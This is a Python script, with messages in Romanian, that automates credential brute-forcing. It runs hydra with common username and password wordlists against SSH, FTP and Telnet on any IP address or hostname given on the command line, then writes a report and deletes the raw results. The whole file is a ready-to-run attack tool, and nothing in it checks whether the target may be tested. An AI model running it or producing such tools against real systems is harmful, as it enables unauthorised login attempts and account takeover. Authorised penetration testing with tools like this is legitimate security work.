#!/usr/bin/python3

import subprocess
import sys
import re

REGEX_IP = "^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
REGEX_DNS = "^(([a-zA-Z]|[a-zA-Z][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\-]*[A-Za-z0-9])$"
LIST_PASSWORD = "~/Documents/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
LIST_USERNAME = "~/Documents/SecLists/Usernames/top-usernames-shortlist.txt"

user_input = sys.argv[1]
comanda_verificare_folder = "ls SCANS/" + user_input
comanda_creare_folder = "mkdir SCANS; mkdir SCANS/" + user_input

hydra_ssh = "timeout 180s hydra -L " + LIST_USERNAME + " -P " + LIST_PASSWORD + " ssh://" + user_input + " -t 5 -f > SCANS/" + user_input + "/hydra_ssh"
hydra_ftp = "timeout 180s hydra -L " + LIST_USERNAME + " -P " + LIST_PASSWORD + " ftp://" + user_input + " -t 5 -f > SCANS/" + user_input + "/hydra_ftp"
hydra_telnet = "timeout 180s hydra -L " + LIST_USERNAME + " -P " + LIST_PASSWORD + " telnet://" + user_input + "  -t 5 -f > SCANS/" + user_input + "/hydra_telnet"
hydra_raport = "./hydra_bash/raport_hydra.sh " + user_input
sterge_fisiere = "rm -rf SCANS/" + user_input + "/hydra_ftp; rm -rf SCANS/" + user_input + "/hydra_ssh; rm -rf SCANS/" + user_input + "/hydra_telnet"


def verificare_input(input):
    pattern_ip = re.compile(REGEX_IP)
    pattern_dns = re.compile(REGEX_DNS)
    if pattern_ip.search(input):
        print('Test brute-force pentru ' + input)
    elif pattern_dns.search(input):
        print('Test brute-force pentru ' + input)
    else:
        raise Exception("Adresa trebuie sa fie de tipul IPv4 sau DNS")


def verificare_folder():
    check = subprocess.run(comanda_verificare_folder, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    if check.returncode != 0:
        subprocess.run(comanda_creare_folder, shell=True, stderr=subprocess.DEVNULL)


def ssh_hydra():
    print("Brute force SSH port 22")
    try:
        ssh = subprocess.run(hydra_ssh, shell=True, timeout=180)
        if ssh.returncode == 0:
            print("Brute force ssh terminat")
        else:
            raise Exception("Eroare brute force ssh")
    except subprocess.TimeoutExpired:
        print("Brute force ssh terminat. TIMEOUT")
        return


def ftp_hydra():
    print("Brute force FTP port 21")
    try:
        ssh = subprocess.run(hydra_ftp, shell=True, timeout=180)
        if ssh.returncode == 0:
            print("Brute force ftp terminat")
        else:
            raise Exception("Eroare brute force ftp")
    except subprocess.TimeoutExpired:
        print("Brute force ftp terminat. TIMEOUT")
        return


def telnet_hydra():
    print("Brute force TELNET port 23")
    try:
        ssh = subprocess.run(hydra_telnet, shell=True, timeout=180)
        if ssh.returncode == 0:
            print("Brute force telnet terminat")
        else:
            raise Exception("Eroare brute force telnet")
    except subprocess.TimeoutExpired:
        print("Brute force telnet terminat. TIMEOUT")
        return


def raport_hydra():
    try:
        raport = subprocess.run(hydra_raport, shell=True)
        print("\n" + "Raportul hydra este gata" + "\n")
    except:
        raise Exception("Eroare la crearea raportului")
    subprocess.run(sterge_fisiere, shell=True)


verificare_input(user_input)
verificare_folder()
ssh_hydra()
ftp_hydra()
telnet_hydra()
raport_hydra()
